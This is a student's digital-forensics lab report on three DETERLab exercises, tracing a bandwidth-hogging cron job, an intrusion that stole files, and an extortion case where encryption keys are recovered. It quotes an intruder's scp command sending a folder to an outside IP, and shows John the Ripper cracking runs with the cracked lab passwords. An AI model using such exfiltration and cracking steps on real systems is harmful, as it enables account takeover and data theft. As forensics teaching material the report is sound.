@@ -1,0 +1,276 @@
+NAME: Dennis Zang
+EMAIL: dennisczang@gmail.com
+DETER USERNAME: la136dc
+
+[Act I: The University Server]
+1) Was the server compromised?
+		No, the server was likely not compromised in any way. Looking at the file "/var/log/auth.log", there were no suspicious logins
+	or failed login attempts. All logins were noramal sshd is likely coming from one of the inside users bob, eric, kevin, peter, or
+	takeda. (Then again, "auth.log" was only open for 5 minutes from 8:55 to 9:00 on Jan 4, so information here is very limited).
+		Of the 5 above users, only kevin and takeda actually have files inside their home directories. Bob, eric, and peter don't
+	have anything suspicious (owner-created) in their home directories. For their histories in ".bash_history", bob only entered an
+	exit command, eric entered mutt (a command-line email client) many times, and peter doesn't seem to have made any commands (there
+	was no ".bash_history" file, which peter may have possibly deleted, but e2undel couldn't find anything deleted on the disk).
+		For kevin and takeda, the files they possessed were linked with their actions. Takeda downloaded and untarred a compressed
+	folder contain a package for an IRC (Internet Relay Chat) bot, Eggdrop. According to takeda's transaction history in
+	"bash_history", takeda has installed Eggdrop, but has never run it any time, so he isn't the culprit.
+		Kevin created a "music" directory in his home directory that contained a large number of mp3 files, a "links" directory that
+	contained soft links to the mp3 files in the "music" directory, and a ".ssh" directory that holds a public and private key
+	(indicating an outside connection). If we look at his transaction history in ".bash_history", we see that kevin is running a cron
+	job ("crontab") to sync files in "music" from "kevin.dynip.com:My_Music/" over an ssh connection ("rsync"). The exact cron job is
+	"0 4 * * * rsync -aq --del --rsh="ssh" -e "ssh -l kevin" "kevin.dynip.com:My_Music/" "~/music"", which runs at 4am, the exact time
+	of the huge spike in Internet traffic. So, kevin is most likely the culprit.
+
+2) Did the attacker accessed any sensitive information?
+	There were no explicit attackers in this case. 
+
+3) Any recovery of meaningful data?
+	There is no meaningful data to recover in this case.
+
+4) What should be done before returning the system to production?
+	There is nothing that did lasting damage to any files or executable in the system. The system can be returned to production,
+	so long as there is no heavy internet traffic going on anymore and the cron jobs are removed.
+
+5) Recommendations as to how to keep this from happening again
+	One thing that can be done is to limit the bandwidth of each user to a specific number, so that the traffic of one user will not
+	lead to the bottlenecking of the entire server and other users (not really a security fix, but for good server implementation).
+
+	6) Estimation on how long this assignment took you
+	This part of the lab took me approximately 4 hours (setting up DETERLAB, reading though specs, going through all files,
+	and writing this part of the report).
+
+	
+	
+[Act II: The Missing Numbers]
+1) Was the server compromised?
+		Yes; besides having the stolen numbers released, the configuration of the server (user data and access) was modified in a way
+	that allows for unauthorized access into the server. We can see this by tracing the history of each user to see what really
+	happened.
+		Let us first look at the user login history. In "/var/log/auth.log", we can see that there is nothing out of the ordinary,
+	except for a lot of failed login attempts from the ip address 193.252.122.103. This is probably one of the ip addresses of one
+	of the attackers (but it is not the known attacker's home ip address 207.92.30.41, but it may be one of the the attacker's
+	secondary addresses in use or a separate attacker). The first successful login was into the account mike, followed by fred,
+	root, and jane. Jake was accessed only locally at address 127.0.0.1.
+		Now, let's look at each users bash history from ".bash_history" for each user (bill, fred, guest, jake, jane, john, mike, and
+	root). The users not accessed from ip address 193.252.122.103 or any sketchy ip address (no "Could not reverse map address"
+	message in "/var/log/auth.log" or access from 127.0.0.1) are probably not involved (bill, guest). For user bill, there is
+	nothing in his directory, and no bash transactions done. He was not accessed from strange ip addresses either, so he is not
+	involved. The same goes for the guest account.
+		Jake was the only user accessed locally (127.0.0.1), and his history and user directory is very sketchy, albeit it was never
+	accessed from ip address 193.252.122.103. We will get back to jake later. 
+		Now, we look at the users fred, jane, mike, and root, since we know for certain that these accounts have definitely been
+	accessed. First, for fred, we see that fred has run the command "whoami", looked inside the folder "/secrets", and tested running
+	vim to create an empty file. Although nothing explicitly harmful was done, it is pretty clear that the user was not "fred", but
+	the attacker lurking around (probably checking current login identity, looking for the files to steal, and testing a few functions
+	here and there). Then, for user jane, ".bash_history" reveals that the user was looking at the files in "/secrets/numbers" and
+	testing file concatenation of file content in "/secrets/other". Again, although nothing harmful was done, the culprit has clearly
+	compromised the accounts and is testing working with the files in these two directories. For mike, the bash history was clearly
+	malicious and done by the criminal. Under the first account compromised, the criminal copied the password file "/etc/passwd" into
+	a file named "calendar.txt" (presumably in his own directory). Then, the criminal downloaded the john-the-ripper password
+	cracker in mike's home directory, make a new folder, added "calendar.txt" into the folder, and ran the password cracker.
+	Presumably, the criminal succeeded, as he logged in as root using "su -" immediately after. Afterwards, the 
+		As root unser "su" (from the account mike), the criminal added a new user, jake, as shown in the lines of "/var/log/auth.log"
+	below:
+		Sep 10 04:20:33 yoyodyne PAM_unix[2650]: (su) session opened for user root by mike(uid=1002)
+		Sep 10 04:21:05 yoyodyne groupadd[2654]: new group: name=jake, gid=1006 
+		Sep 10 04:21:05 yoyodyne useradd[2655]: new user: name=jake, uid=1006, gid=1006, home=/home/jake, shell=/bin/bash 
+		Sep 10 04:21:21 yoyodyne PAM_unix[2658]: Password for jake was changed
+		Sep 10 04:21:51 yoyodyne chfn[2659]: changed user `jake' information. 
+		Sep 10 04:22:17 yoyodyne chfn[2660]: changed user `jake' information. 
+	and the lines in ".bash_history" for root:
+		adduser jake
+		cat /etc/group
+		vi /etc/group
+		ssh jake@localhost
+		The criminal logs into the account jake from root (locally from address 127.0.0.1). Note that the newly created account also
+	has root privileges (line "root:*:0:jake" in /etc/group"). In the account jake, we see that the criminal uses scp to transfer the
+	entire folder to his own home ip address with the command "scp -r secrets d000d@207.92.30.41:~/" (the presence of the ".ssh"
+	folder also indicates that data has been exchanged with outside hosts).
+		In conclusion, yes, the criminal is guilty, but there is a possibility of there being a second outside attacker (as we cannot
+	guarantee that 193.252.122.103 also belongs to the same criminal). The receiver can definitely be proven guilty though.
+
+2) Did the attacker accessed any sensitive information?
+		Yes, the attacker not only accessed and transfered sensitive data (the numbers files) to outside hosts, but also accessed
+	important inside data like password files and other configuration files ("/etc/passwd", "/etc/group", and others).
+
+3) Any recovery of meaningful data?
+		There is no data lost/ deleted on the server, but the leaked data cannot be undone.
+
+4) What should be done before returning the system to production?
+		One thing that was strange was that the attacker easily cracked the password with less than 10 guesses. This hinted that the
+	password was easy to guess. When we ran john on the file /etc/passwd, below was the output:
+		(john --fork=4 passwd)
+		Loaded 8 password hashes with 8 different salts (md5crypt [MD5 32/64 X2])
+		Press 'q' or Ctrl-C to abort, almost any other key for status
+		password1        (mike)
+		password         (guest)
+		tuesday2         (root)
+		baseball8        (fred)
+		3 1g 0:00:01:19 3/3 0.01250g/s 2375p/s 15352c/s 15352C/s shipa..shipo
+		2 2g 0:00:01:19 3/3 0.02500g/s 2724p/s 15345c/s 15345C/s mumplay..mumplol
+		4 1g 0:00:01:19 3/3 0.01250g/s 2377p/s 15351c/s 15351C/s shirity..shirit1
+		1 2g 0:00:01:19 3/3 0.02500g/s 2744p/s 15351c/s 15351C/s speni1..spenin
+		cars1            (john)
+		1 2g 0:00:23:11 3/3 0.001436g/s 2344p/s 14004c/s 14004C/s 19033303..19033306
+		4 2g 0:00:23:11 3/3 0.001436g/s 2052p/s 14029c/s 14029C/s krnold..krnolo
+		2 2g 0:00:23:11 3/3 0.001436g/s 2354p/s 14067c/s 14067C/s tr38an..tr38dp
+		3 1g 0:00:23:11 3/3 0.000718g/s 2017p/s 14050c/s 14050C/s jeneky..jeneks
+		2345b            (bill)
+		2 2g 0:03:46:26 3/3 0.000147g/s 2306p/s 13835c/s 13835C/s parah9D..parahok
+		3 1g 0:03:46:26 3/3 0.000073g/s 1978p/s 13844c/s 13844C/s cb637s..cb637m
+		1 2g 0:03:46:26 3/3 0.000147g/s 2306p/s 13829c/s 13829C/s muccoodi..muccooto
+		Waiting for 3 children to terminate
+		4 3g 0:03:46:26 3/3 0.000220g/s 2277p/s 13840c/s 13840C/s ish5g..isex9
+		Use the "--show" option to display all of the cracked passwords reliably
+		Session aborted
+	Although we prematurely aborted the program, we got these passwords very quickly. With multithreading, we got mike's password
+	literally within a minute. After getting access to the server, getting sensitive data like "/etc/passwd" to perform further
+	exploits becomes much easier.
+		One thing to clearly do is the make harder passwords (ones that are clearly impossible to guess).
+
+5) Recommendations as to how to keep this from happening again
+	Stop using such easy passwords.
+
+6) Estimation on how long this assignment took you
+	This part of the lab took me approximately 6 hours.
+
+	
+	
+[Act III: The Wealthy Individual]
+1) Was the server compromised?
+		Clearly yes, the assignment at hand is to find the keys to decrypt the client's (user rich) swiss bank account access codes
+	and, if possible, find the culprit.
+		We begin by first getting familiar with each of the user's. Be begin with rich, as he is the client at hand. His home
+	directory lacks a ".bash_history" file (probably deleted), and a folder named "swiss_keys" that contains the files "swisskeyN.gpg"
+	for N = 1 to 8. These are probably the encrypted swiss keys we need to decrypt. There is nothing else to look at here (other files
+	are probably deleted).
+		Now we look at all of the other users. Chef only ran commands to create a "recipes" directory with a single file "bread".
+	Gardener is somewhat suspicious: there is nothing personal in his directory, but this "bash_history" contains the commands
+	"cat .bash_history" and "gpg", which indicate that he is looking at his own viewable history and has used gpg, the program
+	used to encrypt the swiss keys. Jeeves is also highly suspicious: there is an empty directory "housekeepers" in his directory
+	(nothing suspicious here), but his ".bash_history" indicate him monitoring who is logged on with "w", has looked at rich's history
+	with "cat /home/rich/.bash_history", and has attempted to use "su" to act as rich and root. Ubuntu is probably an admin user:
+	there is nothing personal in the directory, and "bash_history" indicates that nothing was done except updating and shutting
+	down the server. So, the highly possible suspects are gardener and jeeves.
+		Next, we try to recover the deleted files to see if we can recover some information. When we try to recover rich's files (user
+	1001 as per "/etc/group"), we find his ".bash_history" (which contains history of malicious actions from installing an
+	"extortomatic-keyhider" executable from a website to actually encryting and deleting files). The attack was probably done by
+	somehow getting the access to rich's account.
+		In the history, we see that the gpg encryption was done with symmetric keys, so if we are able to get the keys used for
+	encryption in the filesystem, then we can successfully decrypt the "*.gpg" files in "home/rich/swiss_keys" to get the original
+	keys. Among the deleted files recovered that belonged to rich, we find that 3 of them contains 3 of the symmetric keys used to
+	encrypt the swiss keys (keys 6, 7, and 8)
+		Symmetric keys 6, 7, and 8 are as listed below:
+		"13tulip34root28" (inode 368002 as "6 13tulip34root28")
+		"17jonquil23scent14" (inode 368002 as "7 17jonquil23scent14")
+		"26daisy99daisy99" (inode 368002 as "8 26daisy99daisy99")
+		If we look at "/var/log/auth.log", we can also see that jeeves (uid 1002) has successfully opened sessions as rich and root,
+	as shown with the lines:
+		Sep 10 00:28:37 megabucks su[4365]: + pts/2 jeeves:rich
+		Sep 10 00:28:37 megabucks su[4365]: (pam_unix) session opened for user rich by (uid=1002)
+		...
+		Sep 10 00:37:15 megabucks su[4484]: + pts/2 rich:root
+		Sep 10 00:37:15 megabucks su[4484]: (pam_unix) session opened for user root by (uid=1001)
+		...
+		Sep 10 00:38:19 megabucks su[4512]: + pts/2 jeeves:root
+		Sep 10 00:38:19 megabucks su[4512]: (pam_unix) session opened for user root by (uid=1002)
+	Gardener is suspicious, but we cannot prove that he has done anything harmful explicitly. However, jeeves is definitely guilty of
+	accessing the accounts rich and root. The culprit at hand is probably jeeves.
+		Now for the remaining files. One thing I realized that the attacker forgot to do is that gpg will cache keys for a specified
+	time by default (unless disabled, but not done in rich's "gnupg/gpg.conf"). So, it is likely that the remaining passwords are
+	somewhere in memory. So, mounting the disk image onto the swap partition to actively read the file using the commands
+	"sudo losetup /dev/loop1 act3.img -o 1497000960" and "strings /dev/loop1 > loop1", we find keys 2 and 3:
+	by searching for the keyword "key":
+		"41jade6tree29" ("key2 41jade6tree29p" and " key2 41jade6tree29~~~")
+		"29azalea8flower00" ("key 3 29azalea8flower00")
+		Finally, for keys 1, 4, and 5, we need to search the actual filesystem (that is the only thing we can do left at this point).
+	So, I did a search on the file contents on the /home and /root directories to see if the attacker has left anything following the
+	patterns of the previous keys using the command "sudo grep -RlE "^(key[1-8]|[1-8]key|[1-8]) [a-zA-Z0-9]+$" ./". The only files I
+	found were "/home/rich/.extrtmtc/key4" and "/home/rich/.mozilla/cache/a234Z8x0", whose contents were keys 4 and 5, respectively.
+		"11hibiscus2hibiscus23" ("4 11hibiscus2hibiscus23")
+		"19rose42blossom35" ("5 19rose42blossom35")
+	I didn't bother running the search on the entire filesystem, as that would take too long.
+		Then, I tried doing a file search on the file names in the filesystem (this was more doable). So, I ran a filesystem search on
+	the filenames using "sudo find . -name "*key*" | grep '1'", which resulted in 26 files. I filtered through the names and found
+	"/tmp/extortomatic-23421/key1", whose key and contents were:
+	"23philo7dendron88" ("1 23philo7dendron88")
+		In summary, the keys for decryption are:
+		1) 23philo7dendron88
+		2) 41jade6tree29
+		3) 29azalea8flower00
+		4) 11hibiscus2hibiscus23
+		5) 19rose42blossom35
+		6) 13tulip34root28
+		7) 17jonquil23scent14
+		8) 26daisy99daisy99
+		Using these keys and running "gpg --decrypt swisskeyN.gpg" in "home/rich/swiss_keys", we get the original keys:
+		1) me_and_you_and_you_and_me-so_happy_2gether
+		2) everybody_dance_now_hey_now
+		3) what_would_you_do_if_sang_out_of_tune
+		4) im_pickin_up_good_vibrations
+		5) its_the_little_old_lady_from_pasadena
+		6) raindrops_keep_fallin_on_my_head
+		7) twist_again_like-we_did_last_summer
+		8) goodness_gracious_great_balls_of_fire
+2) Did the attacker accessed any sensitive information?
+		Yes, the attacker had access to all the information in the system (with root access), especially with the swiss bank keys.
+	They also had access to modify such sensitive information as well.
+3) Any recovery of meaningful data?
+		Although we did successfully manage to recover the 8 bank keys, we cannot guarantee the complete recovery of the deleted
+	files.
+4) What should be done before returning the system to production?
+		I don't think that the system should be returned to production (seeing that the attacker was able to modify the files on the
+	filesystem). Besides the executable installed by the attacker to encrypt/delete the original bank keys, who knows what else the
+	attacker has done to the system (possibly installing other harmful executables or daemons to monitor the users, like how jeeves
+	had monitored rich with "w").
+5) Recommendations as to how to keep this from happening again
+		The main thing to do here is to ensure that no one besides the intended user has access to each account (there is nothing
+	that can be done except good secret-keeping practices). Jeeves should definitely be fired though.
+6) Estimation on how long this assignment took you
+	This part of the lab took me approximately 8 hours.
+
+
+
+[Extra Credit]
+(Note that the below commands were not run on the DETERlab server or experimental node, but on my own personal laptop. The
+experimental node only provides a total of 4 cores and no hyperthreading, so a maximum of 4 threads can be run [see "/proc/cpuinfo"
+and output of "nproc -all"].)
+(began 5:15pm)
+(unshadow passwd shadow > unshadowed)
+(john --fork=9 unshadowed)
+Loaded 6 password hashes with 6 different salts (md5crypt [MD5 32/64 X2])
+Node numbers 1-9 of 9 (fork)
+Press 'q' or Ctrl-C to abort, almost any other key for status
+moneymoney       (root)
+butler           (jeeves)
+4 0g 0:00:01:32 3/3 0g/s 1071p/s 6044c/s 6044C/s cissia..cissin
+2 1g 0:00:01:32 3/3 0.01075g/s 1264p/s 6309c/s 6309C/s meck2..mecch
+1 1g 0:00:01:32 3/3 0.01075g/s 1610p/s 7756c/s 7756C/s lose06..lose09
+9 0g 0:00:01:32 3/3 0g/s 1297p/s 7411c/s 7411C/s apilar..apilah
+5 0g 0:00:01:32 3/3 0g/s 1021p/s 5749c/s 5749C/s septardoo..seppylock
+7 1g 0:00:01:32 3/3 0.01075g/s 1701p/s 8214c/s 8214C/s amtt1..amttu
+6 0g 0:00:01:32 3/3 0g/s 1394p/s 7988c/s 7988C/s 242047..242049
+3 0g 0:00:01:32 3/3 0g/s 1161p/s 6585c/s 6585C/s biamalo..biamals
+8 0g 0:00:01:32 3/3 0g/s 1252p/s 7135c/s 7135C/s 232663..232664
+plants           (gardener)
+4 0g 0:00:06:34 3/3 0g/s 1789p/s 10649c/s 10649C/s braggls..braggoy
+6 0g 0:00:06:34 3/3 0g/s 1946p/s 11589c/s 11589C/s lc112s..lc117g
+2 1g 0:00:06:34 3/3 0.002531g/s 2243p/s 11214c/s 11214C/s jl1cle..jl1cla
+8 0g 0:00:06:34 3/3 0g/s 1519p/s 9025c/s 9025C/s abc9th..abc9tt
+1 1g 0:00:06:34 3/3 0.002531g/s 2363p/s 11745c/s 11745C/s bjk0k..bjk0l
+3 0g 0:00:06:34 3/3 0g/s 1873p/s 11153c/s 11153C/s spideah..spidada
+9 1g 0:00:06:34 3/3 0.002531g/s 1606p/s 9155c/s 9155C/s 0rods2..0rodsy
+7 1g 0:00:06:34 3/3 0.002531g/s 2083p/s 10347c/s 10347C/s jazyban..jazybag
+5 0g 0:00:06:34 3/3 0g/s 1520p/s 9033c/s 9033C/s pond08..pond01
+food             (chef)
+9 1g 0:00:38:14 3/3 0.000435g/s 2147p/s 10929c/s 10929C/s tangdun..tangdu1
+7 1g 0:00:38:14 3/3 0.000435g/s 2083p/s 10406c/s 10406C/s 2702na..2702ng
+2 2g 0:00:38:14 3/3 0.000871g/s 2536p/s 11326c/s 11326C/s 022n2k..022n2n
+4 0g 0:00:38:14 3/3 0g/s 1914p/s 11473c/s 11473C/s 2leuea..2leue5
+8 0g 0:00:38:14 3/3 0g/s 1874p/s 11229c/s 11229C/s levll02..levll00
+5 0g 0:00:38:14 3/3 0g/s 1944p/s 11654c/s 11654C/s knjs1..knjsc
+3 0g 0:00:38:14 3/3 0g/s 2038p/s 12216c/s 12216C/s gfsun..gfsum
+6 0g 0:00:38:14 3/3 0g/s 1884p/s 11292c/s 11292C/s j163aam..j163aas
+1 1g 0:00:38:14 3/3 0.000435g/s 2277p/s 11376c/s 11376C/s 10353085..10353084
+
+
